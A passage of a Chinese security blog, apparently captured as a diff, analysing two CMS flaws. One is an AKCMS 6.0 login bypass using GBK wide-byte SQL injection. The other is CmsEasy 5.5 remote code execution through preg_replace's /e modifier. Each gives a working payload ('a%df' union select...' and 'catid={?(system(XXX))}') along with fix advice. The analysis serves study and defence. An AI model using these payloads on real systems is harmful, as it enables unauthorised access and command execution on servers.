&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> displaytemplate(<span class="string">'login.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当进入<code>login.php</code>后，首先包含文件<code>admin.inc.php</code>，接下来判断是否设置了<code>post_loginsubmit</code>这个变量，如果设置了则继续判断，没有设置的话，就跳到<code>login.html</code>，提示用户登录。</p>
+<p>一般来说第一次点击<code>login.php</code>，肯定是没有设置之前那个变量的，因此就会提示登录。</p>
+<p>继续看登录之后的判断逻辑。</p>
+<p>将参数传递进去，传递给get_by函数，然后从数据库将对应的字符串取出来，对比两个的哈希值，我们继续跟进get_by函数，位于<code>include/db.class.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_by</span><span class="params">($what, $from, $where = <span class="string">''</span>, $orderby = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">  $table = <span class="keyword">$this</span>-&gt;fulltablename($from);</span><br><span class="line">  $sql = <span class="string">"SELECT &#123;$what&#125; FROM `&#123;$table&#125;`"</span>;</span><br><span class="line">  <span class="keyword">if</span>($where != <span class="string">''</span>) $sql .= <span class="string">" WHERE &#123;$where&#125;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($orderby != <span class="string">''</span>) $sql .= <span class="string">" ORDER BY &#123;$orderby&#125;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(strpos($what, <span class="string">'('</span>) === <span class="keyword">false</span>) $sql .= <span class="string">" LIMIT 1"</span>;</span><br><span class="line">  $row = <span class="keyword">$this</span>-&gt;get_one($sql);</span><br><span class="line">  <span class="keyword">if</span>($row === <span class="keyword">false</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span>(count($row) == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> current($row);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> $row;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>在函数 get_by中，我们可以看到，根据传入的参数，拼接sql语句后，传入到get_one中，在传入之前，并没有做任何的过滤，跟进get_one：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_one</span><span class="params">($sql)</span> </span>&#123;</span><br><span class="line">  $arr = <span class="keyword">$this</span>-&gt;querytoarray($sql, <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(count($arr) &gt; <span class="number">0</span>) <span class="keyword">return</span> array_shift($arr);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>它调用了querytoarray这个函数，继续跟进这个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">querytoarray</span><span class="params">($sql, $key = <span class="string">''</span>, $num = <span class="number">1000</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $sqlcaches;</span><br><span class="line">  $results = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($GLOBALS[<span class="string">'batchcreateitemflag'</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">isset</span>($sqlcaches)) $sqlcaches = <span class="keyword">array</span>();</span><br><span class="line">   $cachekey = $sql.<span class="string">'*'</span>.$num;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($sqlcaches[$cachekey])) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $query = <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">  $i = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>($row = <span class="keyword">$this</span>-&gt;fetch_array($query)) &#123;</span><br><span class="line">   <span class="keyword">if</span>($key == <span class="string">''</span> || !<span class="keyword">isset</span>($row[$key])) &#123;</span><br><span class="line">    $results[$i] = $row;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $results[$row[$key]] = $row;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($i ++ &gt;= $num) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $results;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这么一句代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="keyword">$this</span>-&gt;query($sql);</span><br></pre></td></tr></table></figure>
+<p>将sql传入到query中，但这里并没有真正的执行，因此继续跟进query：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql, $ignoresafe = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $ifdebug, $slowquery, $thetime;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($ifdebug)) $start = akmicrotime();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>($ignoresafe)) &#123;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/^(select|delete)\s+.*?(select|update|detele|insert|replace)\s+/i'</span>, $sql, $match)) &#123;</span><br><span class="line">    eventlog(<span class="string">"REJECT\t"</span>.$sql, <span class="string">'sql'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($ignoresafe == <span class="number">1</span> &amp;&amp; strpos($sql, <span class="string">";\n"</span>) != <span class="keyword">false</span>) &#123;</span><br><span class="line">   $sqls = explode(<span class="string">";\n"</span>, $sql);</span><br><span class="line">   <span class="keyword">foreach</span>($sqls <span class="keyword">as</span> $sql) &#123;</span><br><span class="line">    <span class="keyword">if</span>(trim($sql) != <span class="string">""</span>) $query = <span class="keyword">$this</span>-&gt;_query($sql);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $query = <span class="keyword">$this</span>-&gt;_query($sql);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>首先将sql传入进来，然后经过正则表达式的过滤，在最后调用了_query，这个query就是对sql查询的具体实现。</p>
+<p>通过上述分析，我们可以得出：</p>
+<p><strong>sql在query函数中用了正则表达式做了过滤</strong></p>
+<p><strong>post_username只在login.php中用了addslashes处理。</strong></p>
+<p>只有这两处做了过滤，只要我们绕过了这两处过滤，就可以成功注入。</p>
+<p><strong>如何构造Payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(select|delete)\s+.*?(select|update|detele|insert|replace)\s+/i'</span>, $sql, $match)) &#123;</span><br><span class="line"> eventlog(<span class="string">"REJECT\t"</span>.$sql, <span class="string">'sql'</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过sql在query函数中用正则表达式做过滤，可以用/**/代替空格绕过。</p>
+<p><code>addslashes</code>使用反斜线引用字符串，在单引号，双引号，反斜线，NUL前加反斜线，导致无法闭合。可以利用<strong>GBK宽字符注入</strong>：<strong>在引号前加%df</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> `\xdf\x5c`.decode(<span class="string">'gbk'</span>)     得軍汉字 其中x5c为\</span><br><span class="line">GBK编码，编码范围是<span class="number">0x8140</span>~<span class="number">0xFEFE</span>（不包括xx7F），在遇到%df(ascii(<span class="number">223</span>))&gt;ascii(<span class="number">128</span>)时自动拼接%<span class="number">5</span>c，因此吃掉\，而%<span class="number">27</span>，%<span class="number">20</span>小于ascii(<span class="number">128</span>)的字符就保留了。</span><br></pre></td></tr></table></figure>
+<p>最后分析login的校验为md52次，分析表结构，通过联合union查询，通过分析我们可以得出payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=login&amp;username=a％df' union select/**/1,2,md5(md5(3)),4,5,6#password=3&amp;loginsubmit=％B5％C7％C2％BC</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="http://xx.xx.xx.xx/_aak_cms111/index.php?file=login&amp;crumb=eflAT3" target="_blank" rel="noopener">http://xx.xx.xx.xx/_aak_cms111/index.php?file=login&amp;crumb=eflAT3</a></p>
+<p>利用hackbar，post-payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=login&amp;username=a％df<span class="string">' union select/**/1,2,md5(md5(3)),4,5,6#password=3&amp;loginsubmit=％B5％C7％C2％BC</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><p>1.代码使用了<code>mysql_query(&quot;set names gbk&quot;)</code>来设置编码，mysql中推荐使用<code>mysql_set_charset(&quot;gbk&quot;)</code>函数来进行编码设置。后者会修改mysql对象中的<code>mysql-&gt;charset</code>属性为设置的字符集。</p>
+<p>2.配套的过滤函数为<code>mysql_real_escape_string()</code></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-CmsEasy-5-5-代码执行漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/">CmsEasy 5.5 代码执行漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/" class="archive-article-date">
+  	<time datetime="2018-12-02T07:08:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>CmsEasy</strong></p>
+<p>是一款基于 PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。 采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>本次漏洞的根源产生在PHP函数preg_replace上，攻击者可以通过构造语句，达到任意代码执行的目的。</p>
+<p><strong>影响范围</strong></p>
+<p>CmsEasy 5.5 20130716</p>
+<p><strong>漏洞危害</strong></p>
+<p>成功利用该漏洞后，攻击者可以远程任意代码执行，直接调用服务器命令终端，执行任意命令，直接威胁到服务器的安全。</p>
+<p><strong>代码执行漏洞</strong></p>
+<p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞的根源出现在PHP函数<code>preg_replace</code> 上，首先来了解一下这个函数：</p>
+<p>这个函数的作用是执行正则表达式的搜索和替换，它的语法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
+<ul>
+<li>参数 pattern 代表正则表达式</li>
+<li>参数 replacement表示替换的内容</li>
+<li>参数 subject表示需要匹配替换的对象</li>
+<li>参数 limit 则表示指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。</li>
+</ul>
+<p>重点在于pattern参数，可以使用一些PCRE修饰符，包括被启用的<code>e(PREG_REPLACE_EVAL)</code>，接下来再来了解一下这个函数的危害：</p>
+<p>这个函数从PHP5.5以后已经废弃，官方建议不要使用本特性。</p>
+<p>函数<code>preg_replace</code>在进行了对替换字符串的过滤和验证后，<strong>会将替换后的字符串作为PHP代码执行返回。</strong></p>
+<p>了解了这个函数的危害后，下面具体分析代码：</p>
+<p>在<code>lib/tool/form.php</code> 中，漏洞代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getform</span><span class="params">($name,$form,$field,$data)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (get(<span class="string">'table'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'table'</span>)][$name]))</span><br><span class="line">           $form[$name]=setting::$var[get(<span class="string">'table'</span>)][$name];</span><br><span class="line">       <span class="keyword">if</span> (get(<span class="string">'form'</span>) &amp;&amp;<span class="keyword">isset</span>(setting::$var[get(<span class="string">'form'</span>)][$name]))</span><br><span class="line">           $form[$name]=setting::$var[get(<span class="string">'form'</span>)][$name];</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">           $form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[$name]) &amp;&amp;<span class="keyword">isset</span>($form[$name][<span class="string">'default'</span>]))</span><br><span class="line">           $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">       <span class="keyword">if</span> (preg_match(<span class="string">'/templat/'</span>,$name) &amp;&amp;<span class="keyword">empty</span>($data[$name]))</span><br><span class="line">           $data[$name]=@$form[$name][<span class="string">'default'</span>];</span><br><span class="line">       <span class="keyword">if</span> (@$form[$name][<span class="string">'filetype'</span>] == <span class="string">'image'</span>) &#123;</span><br><span class="line">           $return=form::upload_image($name,front::post($name) ?front::post($name) : @$data[$name]);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>系统定义了 getform函数，问题在函数的第三个if语句下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$form[$name][<span class="string">'default'</span>]=preg_replace(<span class="string">'/\&#123;\?([^&#125;]+)\&#125;/e'</span>,<span class="string">"eval('return $1;')"</span>,$form[$name][<span class="string">'default'</span>]);</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，要替换的内容为<code>form[$name][&#39;default&#39;]</code> ，根据以上的分析，可以得知，如果可以让我们控制替换内容的字符串内容，在替换的时候，就会发生代码执行。</p>
+<p>因此现在的关键点在于，寻找一个<code>form[$name][&#39;default&#39;]</code> 的用户控制点。</p>
+<p>在<code>lib/table/archive.php</code> 中我们找到了用户可控点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_form</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">             <span class="string">'catid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(category::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;intval(get(<span class="string">'catid'</span>)),</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br><span class="line">             <span class="string">'typeid'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(type::option(<span class="number">0</span>,<span class="string">'tolast'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;intval(get(<span class="string">'typeid'</span>)),</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br><span class="line"> <span class="string">'toppost'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                     <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                     <span class="string">'select'</span>=&gt;form::arraytoselect(<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'不置顶'</span>,<span class="number">2</span>=&gt;<span class="string">'栏目置顶'</span>,<span class="number">3</span>=&gt;<span class="string">'全站置顶'</span>)),</span><br><span class="line">                     <span class="string">'default'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">                     <span class="string">'regex'</span>=&gt;<span class="string">'/\d+/'</span>,</span><br><span class="line">                     <span class="string">'filter'</span>=&gt;<span class="string">'is_numeric'</span>,</span><br><span class="line">             ),</span><br></pre></td></tr></table></figure>
+<p>定义了一个get_form 这个函数，返回一个数组，其中catid数组中，可以看到default通过传参获取内容，用户可以进行控制。</p>
+<p>接下来看看catid和getform是怎么配合使用的？</p>
+<p>查看文件<code>template\default\manage\guestadd.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[removed]</span><br><span class="line">&#123;lang(addcategory)&#125;           &#123;form::getform('catid',$form,$field,$data)&#125;</span><br><span class="line">&#123;lang(addtype)&#125;           &#123;form::getform('typeid',$form,$field,$data)&#125;</span><br><span class="line">&#123;lang(title)&#125;           &#123;form::getform('title',$form,$field,$data)&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在模板中直接调用了getform函数，然后传递了catid参数。</p>
+<p>通过回朔追踪追踪，得知<code>guestadd.html</code> 是由<code>guesttadd_action</code>函数来控制的，而这个函数的在<code>lib\default\manage_act.php</code> 中，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'ROOT'</span>)) <span class="keyword">exit</span>(<span class="string">'Can\'t Access !'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">manage_act</span> <span class="keyword">extends</span> <span class="title">act</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user=<span class="string">''</span>;</span><br><span class="line">        $guest = front::get(<span class="string">'guest'</span>);</span><br><span class="line">        <span class="keyword">if</span>($guest==<span class="string">'1'</span>&amp;&amp;config::get(<span class="string">'opguestadd'</span>)) &#123;</span><br><span class="line">            $user = <span class="string">'Guest'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(cookie::get(<span class="string">'login_username'</span>) &amp;&amp;cookie::get(<span class="string">'login_password'</span>)) &#123;</span><br><span class="line">                $user=<span class="keyword">new</span> user();</span><br><span class="line">                $user=$user-&gt;getrow(<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;cookie::get(<span class="string">'login_username'</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cookie::get(<span class="string">'login_username'</span>) &amp;&amp;cookie::get(<span class="string">'login_password'</span>)) &#123;</span><br><span class="line">            $guestuser=<span class="keyword">new</span> user();</span><br><span class="line">            $guestuser=$guestuser-&gt;getrow(<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;cookie::get(<span class="string">'login_username'</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;guestuser = $guestuser;</span><br><span class="line">        <span class="keyword">if</span>(!$user &amp;&amp;front::$act != <span class="string">'login'</span>&amp;&amp;front::$act != <span class="string">'register'</span>)  front::redirect(url::create(<span class="string">'user/login'</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_user=<span class="keyword">new</span> user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table=front::get(<span class="string">'manage'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table &lt;&gt;<span class="string">'archive'</span>&amp;&amp;<span class="keyword">$this</span>-&gt;table &lt;&gt;<span class="string">'orders'</span>) <span class="keyword">exit</span>(<span class="string">'PAGE NOT FOUND!'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_table=<span class="keyword">new</span> <span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_table-&gt;getFields();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;form=<span class="keyword">$this</span>-&gt;_table-&gt;get_form();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pagesize=config::get(<span class="string">'manage_pagesize'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;manage=<span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;primary_key=<span class="keyword">$this</span>-&gt;_table-&gt;primary_key;</span><br><span class="line">        <span class="keyword">if</span>(!front::get(<span class="string">'page'</span>)) front::$get[<span class="string">'page'</span>]=<span class="number">1</span>;</span><br><span class="line">        $manage=<span class="string">'table_'</span>.<span class="keyword">$this</span>-&gt;table;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;manage=<span class="keyword">new</span> $manage;</span><br></pre></td></tr></table></figure>
+<p>在其第29行有如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;view-&gt;form=<span class="keyword">$this</span>-&gt;_table-&gt;get_form();</span><br></pre></td></tr></table></figure>
+<p>把模板里面的变量form赋值成为this中table下的get_form，就是在这里调用之前返回数组的函数。</p>
+<p><strong>总结：</strong></p>
+<p>首先是manage_act.php，它是控制器的一个文件，初始化之后，它回去调用guestadd_action()，执行完数据后，再传递给guestadd.html，进行渲染。</p>
+<p>manage_act.php在调用guestadd_action()之前，首先会初始化init()，init()会调用get-form()，而get-form会调用catid这个数组，这里我们就可以对catid进行控制。</p>
+<p>接下来catid会传递到 $this-&gt;view-&gt;form 这个变量里去，并再次调用getform这个函数，将catid传递进来。最后进行了正则过滤，这里也就是重点，从而会导致系统将我们传入的字符串通过preg_replace来执行出php代码的效果。</p>
+<p>最终payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catid=&#123;?(system(XXX))&#125;</span><br></pre></td></tr></table></figure>
+<p>其中XXX代表我们要执行的命令。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开浏览器，访问目标站点，在首页点击网页底部的游客投稿。</p>
+<p><code>http://www.test.ichunqiu/?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1</code></p>
+<p>接下来点击<code>Enable Post data</code> ，使用Post方式发送恶意数据包，将payload写入数据框，点击提交。</p>
+<p><code>catid={？(system(whoami))}</code></p>
+<p>或者<code>typeid</code></p>
+<p>提交了whoami命令，在所属栏目一项，系统已经执行了命令，显示当前用户为system。</p>
+<h3 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h3><p>代码执行漏洞相比较其他的漏洞，如Sql注入，XSS，包含漏洞等，危害更大，一旦执行成功，甚至可以直接拿下服务器的权限，因此根据之前的学习，对漏洞的修复应注意以下几点：</p>
+<ul>
+<li>所有输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数的参数不允许外部传递。</li>
+<li>不仅要验证数据的类型，还要验证其格式、长度、范围和内容。</li>
+<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
+<li>对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</li>
+</ul>
+<p><strong>修复建议</strong></p>
+<p>升级版本即可</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/02/CmsEasy-5-5-代码执行漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
